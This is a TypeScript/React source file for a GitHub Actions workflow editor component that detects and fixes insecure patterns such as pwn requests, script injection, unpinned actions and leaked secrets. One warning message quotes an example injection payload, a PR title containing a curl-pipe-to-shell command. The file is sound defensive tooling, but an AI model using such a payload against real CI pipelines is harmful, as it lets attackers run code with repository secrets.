"use client"

// Bollard UI — workflow-yaml-guard · MIT licence · https://bollard-ui.vercel.app/components/workflow-yaml-guard

import * as React from "react"
import { CircleAlert, CircleCheck, Info, Loader2, ShieldAlert, TriangleAlert, WandSparkles } from "lucide-react"

import { cn } from "@/lib/utils"
import { checkWorkflow, pinAction, workflowSummary, type WorkflowIssue } from "@/registry/default/workflow-yaml-guard/workflow"

export { checkWorkflow, endLine, parseYaml, pinAction, workflowSummary, type WorkflowContext, type WorkflowIssue, type WorkflowIssueKind, type YNode } from "@/registry/default/workflow-yaml-guard/workflow"

export const WORKFLOW_YAML_GUARD_MESSAGES = {
  label: ".github/workflows/ci.yml",
  placeholder: "on: pull_request\njobs:\n  test:\n    runs-on: ubuntu-latest",
  clean: "No problems found.",
  problems: "{errors} to fix · {warnings} to review",
  line: "Line {line}",
  selectLine: "Select line {line}",
  fixAll: "Fix {count}",
  fix: "Fix",
  summary: "Runs on {triggers}{forks} · token: {token}",
  forks: " (fork PRs can trigger it)",
  tokenDefault: "repo default, may be read/write",
  "pwn-request": "{detail} runs with secrets and a write token, and this step checks out the PR's code, so anyone who opens a PR can run code with them (a \"pwn request\").",
  "fix-pwn-request": "Use pull_request",
  injection: "{detail} is written by whoever opens the PR or issue, and ${{ }} pastes it into the script before the shell runs, so a title containing $(curl evil.sh | sh) runs as code.",
  "event-in-run": "{detail} is pasted into the script as code. Pass it through env instead.",
  "fix-injection": "Pass through env",
  unpinned: "{detail} is a tag that can be moved to new code. Pin the full commit SHA.",
  pin: "Pin SHA",
  pinning: "Looking up…",
  pinFailed: "Couldn't look up the SHA. Run: git ls-remote https://github.com/{action} {ref}",
  pinned: "Pinned {action} to {sha}.",
  "permissions-missing": "No permissions block, so the token gets the repo's default, which can be write access to everything.",
  "fix-permissions-missing": "Start read-only",
  "write-all": "write-all gives every job write access to code, releases and packages.",
  "fix-write-all": "Read-only token",
  "secret-dump": "toJSON(secrets) prints every secret as one JSON blob, and log masking can't redact structured data.",
  "secret-echo": "This prints a secret to the log. Masking is best effort: one transformation and it shows in plain text.",
  "secret-transform": "This transforms a secret (base64, sed…), so log masking no longer recognises it.",
  "fix-secret": "Remove line",
  "self-hosted": "Job {detail} runs on a self-hosted runner that fork PRs can reach, so a PR can run code on your machine and keep it.",
  "fix-self-hosted": "Use a GitHub-hosted runner",
}
export type WorkflowYamlGuardMessages = typeof WORKFLOW_YAML_GUARD_MESSAGES

const fill = (text: string, values: Record<string, string | number>) => text.replace(/\{(\w+)\}/g, (match, key: string) => String(values[key] ?? match))
const tones = { error: "text-red-700 dark:text-red-400", warning: "text-amber-700 dark:text-amber-400", info: "text-muted-foreground" }
const icons = { error: CircleAlert, warning: TriangleAlert, info: Info }
const fixClass = (error: boolean) =>
  cn(
    "inline-flex min-h-6 max-w-full items-center gap-1 rounded-md border px-2 text-left font-medium [overflow-wrap:anywhere] transition-colors outline-none focus-visible:ring-[3px] focus-visible:ring-ring/50 aria-disabled:opacity-60",
    error ? "border-red-500/40 text-red-800 hover:bg-red-500/10 dark:text-red-200" : "border-amber-500/40 text-amber-900 hover:bg-amber-500/10 dark:text-amber-200",
  )

function useSettled(text: string, delay = 900) {
  const [settled, setSettled] = React.useState(text)
  React.useEffect(() => {
    const timer = setTimeout(() => setSettled(text), delay)
    return () => clearTimeout(timer)
  }, [text, delay])
  return settled
}

export interface WorkflowYamlGuardProps extends Omit<React.ComponentProps<"textarea">, "value" | "defaultValue" | "onChange"> {
  /** Controlled workflow YAML. */
  value?: string
  /** Initial YAML when uncontrolled. */
  defaultValue?: string
  /** Called with the new text on every edit or fix. */
  onValueChange?: (value: string) => void
  /** Repo visibility. Self-hosted runners reachable from forks are errors on public repos and skipped on private ones. */
  visibility?: "public" | "private"
  /** Looks up the commit SHA for an action's tag (e.g. via the GitHub API). Enables "Pin SHA". */
  resolveSha?: (action: string, ref: string) => Promise<string>
  /** Visible label; shorthand for `messages.label`. */
  label?: string
  /** Every visible string. `{line}`, `{detail}`, `{action}`, `{ref}`, `{sha}` are filled in. */
  messages?: Partial<WorkflowYamlGuardMessages>
}

/**
 * A GitHub Actions workflow editor that catches the mistakes GitHub Security Lab keeps finding: pull_request_target
 * checking out the PR (pwn requests), untrusted ${{ github.event.* }} pasted into run scripts, actions pinned to
 * movable tags, missing or write-all token permissions, secrets printed or transformed in logs, and self-hosted
 * runners reachable from fork PRs. Most fix in one tap; "Pin SHA" looks the commit up through `resolveSha`.
 */
export function WorkflowYamlGuard({ value, defaultValue = "", onValueChange, visibility, resolveSha, label, messages, rows = 12, id, className, ref, "aria-describedby": describedBy, ...props }: WorkflowYamlGuardProps) {
  const t = { ...WORKFLOW_YAML_GUARD_MESSAGES, ...messages, ...(label !== undefined && { label }) }
  const [inner, setInner] = React.useState(defaultValue)
  const [pending, setPending] = React.useState<number | null>(null)
  const [failed, setFailed] = React.useState<number | null>(null)
  const [notice, setNotice] = React.useState("")
  const textarea = React.useRef<HTMLTextAreaElement>(null)
  const list = React.useRef<HTMLUListElement>(null)
  const refocus = React.useRef<number | null>(null)
  const latest = React.useRef("")
  const autoId = React.useId()
  const inputId = id ?? autoId
  const raw = value ?? inner
  const text = typeof raw === "string" ? raw : ""
  latest.current = text
  React.useImperativeHandle(ref, () => textarea.current as HTMLTextAreaElement)

  const issues = React.useMemo(() => checkWorkflow(text, { visibility }), [text, visibility])
  const summary = React.useMemo(() => workflowSummary(text), [text])
  const counted = issues.filter((issue) => issue.severity !== "info")
  const errors = counted.filter((issue) => issue.severity === "error").length
  const fixable = counted.filter((issue) => issue.fix !== undefined)
  const status = !text.trim() ? "" : counted.length ? fill(t.problems, { errors, warnings: counted.length - errors }) : t.clean
  const settled = useSettled(status)
  React.useEffect(() => {
    setNotice("")
    setFailed(null)
  }, [text])

  const update = (next: string) => {
    if (value === undefined) setInner(next)
    onValueChange?.(next)
  }
  React.useEffect(() => {
    if (refocus.current === null) return
    const buttons = list.current?.querySelectorAll<HTMLButtonElement>("button[data-fix]") ?? []
    ;(buttons[Math.min(refocus.current, buttons.length - 1)] ?? textarea.current)?.focus()
    refocus.current = null
  }, [text])
  const indexOf = (button: HTMLElement) => [...(list.current?.querySelectorAll("button[data-fix]") ?? [])].indexOf(button)
  const fix = (issue: WorkflowIssue, button: HTMLElement) => {
    refocus.current = indexOf(button)
    update(issue.fix ?? text)
  }
  const fixAll = () => {
    let next = text
    for (let round = 0; round < 30; round++) {
      const first = checkWorkflow(next, { visibility }).find((issue) => issue.severity !== "info" && issue.fix)
      if (!first?.fix || first.fix === next) break
      next = first.fix
    }
    refocus.current = 0
    update(next)
  }
  /** Looks up the SHA once at a time; a result that arrives after the user edited is dropped. */
  const pin = async (issue: WorkflowIssue, button: HTMLElement) => {
    if (!resolveSha || !issue.pin || pending !== null) return
    const asked = text
    const position = indexOf(button)
    setPending(issue.line)
    setFailed(null)
    try {
      const sha = (await resolveSha(issue.pin.action, issue.pin.ref)).trim().toLowerCase()
      if (latest.current !== asked) return
      const next = pinAction(asked, issue.line, sha)
      if (next === asked) throw new Error("not a SHA")
      refocus.current = position
      setNotice(fill(t.pinned, { action: issue.pin.action, sha: sha.slice(0, 7) }))
      update(next)
    } catch {
      if (latest.current === asked) {
        setFailed(issue.line)
        setNotice(fill(t.pinFailed, { action: issue.pin.action, ref: issue.pin.ref }))
      }
    } finally {
      setPending(null)
    }
  }
  const reveal = (line: number) => {
    const el = textarea.current
    if (!el) return
    const rowsText = text.replace(/^\uFEFF/, "").split(/\r\n|\r|\n/)
    const newline = text.includes("\r\n") ? 2 : 1
    const start = rowsText.slice(0, line).reduce((sum, row) => sum + row.length + newline, text.startsWith("\uFEFF") ? 1 : 0)
    el.focus()
    el.setSelectionRange(start, start + (rowsText[line]?.length ?? 0))
  }
  const fixLabel = (issue: WorkflowIssue) => (t as Record<string, string>)[issue.kind.startsWith("secret") ? "fix-secret" : issue.kind === "event-in-run" ? "fix-injection" : `fix-${issue.kind}`] ?? t.fix

  return (
    <div data-slot="workflow-yaml-guard" className={cn("grid w-full max-w-xl min-w-0 grid-cols-[minmax(0,1fr)] gap-1.5 text-sm", className)}>
      <label htmlFor={inputId} className="w-fit font-mono font-medium [overflow-wrap:anywhere]">
        {t.label}
      </label>
      <textarea
        ref={textarea}
        id={inputId}
        rows={rows}
        value={text}
        onChange={(event) => update(event.target.value)}
        spellCheck={false}
        autoCapitalize="none"
        autoCorrect="off"
        wrap="off"
        placeholder={t.placeholder}
        aria-invalid={errors > 0 || undefined}
        aria-describedby={[describedBy, `${inputId}-status`].filter(Boolean).join(" ")}
        className="w-full min-w-0 resize-y rounded-md border bg-transparent px-3 py-2 font-mono text-base leading-5 shadow-xs transition-[color,box-shadow] outline-none placeholder:text-muted-foreground focus-visible:border-ring focus-visible:ring-[3px] focus-visible:ring-ring/50 aria-invalid:border-destructive md:text-xs dark:bg-input/30"
        {...props}
      />
      <span role="status" className="sr-only">
        {notice || settled}
      </span>
      <div id={`${inputId}-status`} className="mt-1.5 grid gap-1.5 text-xs empty:hidden">
        {summary && summary.triggers.length > 0 && (
          <span className={cn("flex items-start gap-1.5", summary.forks && !summary.permissions ? "text-amber-700 dark:text-amber-400" : "text-muted-foreground")}>
            <ShieldAlert aria-hidden className="mt-px size-3.5 shrink-0" />
            <span className="min-w-0 [overflow-wrap:anywhere]">{fill(t.summary, { triggers: summary.triggers.join(", "), forks: summary.forks ? t.forks : "", token: summary.permissions ?? t.tokenDefault })}</span>
          </span>
        )}
        {status && (
          <span className="flex min-h-6 flex-wrap items-center justify-between gap-2">
            <span className={cn("flex items-center gap-1.5", counted.length ? "text-muted-foreground" : "text-emerald-700 dark:text-emerald-400")}>
              {counted.length ? <TriangleAlert aria-hidden className="size-3.5 text-amber-600 dark:text-amber-400" /> : <CircleCheck aria-hidden className="size-3.5" />}
              {status}
            </span>
            {fixable.length > 1 && (
              <button type="button" onClick={fixAll} className={fixClass(false)}>
                <WandSparkles aria-hidden className="size-3.5" />
                {fill(t.fixAll, { count: fixable.length })}
              </button>
            )}
          </span>
        )}
      </div>
      {issues.length > 0 && (
        <ul ref={list} className="grid gap-1.5 text-xs">
          {issues.map((issue) => {
            const Icon = icons[issue.severity]
            const busy = pending === issue.line
            return (
              <li key={`${issue.line}-${issue.kind}-${issue.detail ?? ""}`} className={cn("flex gap-1.5", tones[issue.severity])}>
                <span className="flex h-6 shrink-0 items-center">
                  <Icon aria-hidden className="size-3.5" />
                </span>
                <span className="flex min-w-0 flex-wrap items-center gap-x-2 gap-y-1">
                  <span className="min-w-0 py-1 [overflow-wrap:anywhere]">
                    <button type="button" onClick={() => reveal(issue.line)} aria-label={fill(t.selectLine, { line: issue.line + 1 })} className="mr-1 rounded font-mono whitespace-nowrap text-muted-foreground tabular-nums underline-offset-2 outline-none hover:text-foreground hover:underline focus-visible:ring-[3px] focus-visible:ring-ring/50">
                      {fill(t.line, { line: issue.line + 1 })}
                    </button>
                    {fill((t as Record<string, string>)[issue.kind], { detail: issue.detail ?? "" })}
                    {failed === issue.line && issue.pin && <span className="mt-1 block font-mono">{fill(t.pinFailed, { action: issue.pin.action, ref: issue.pin.ref })}</span>}
                  </span>
                  {issue.fix !== undefined && (
                    <button type="button" data-fix="" onClick={(event) => fix(issue, event.currentTarget)} className={fixClass(issue.severity === "error")}>
                      {fixLabel(issue)}
                    </button>
                  )}
                  {issue.pin && resolveSha && (
                    <button type="button" data-fix="" aria-disabled={pending !== null || undefined} aria-busy={busy || undefined} onClick={(event) => pin(issue, event.currentTarget)} className={fixClass(false)}>
                      {busy && <Loader2 aria-hidden className="size-3.5 animate-spin" />}
                      {busy ? t.pinning : t.pin}
                    </button>
                  )}
                </span>
              </li>
            )
          })}
        </ul>
      )}
    </div>
  )
}
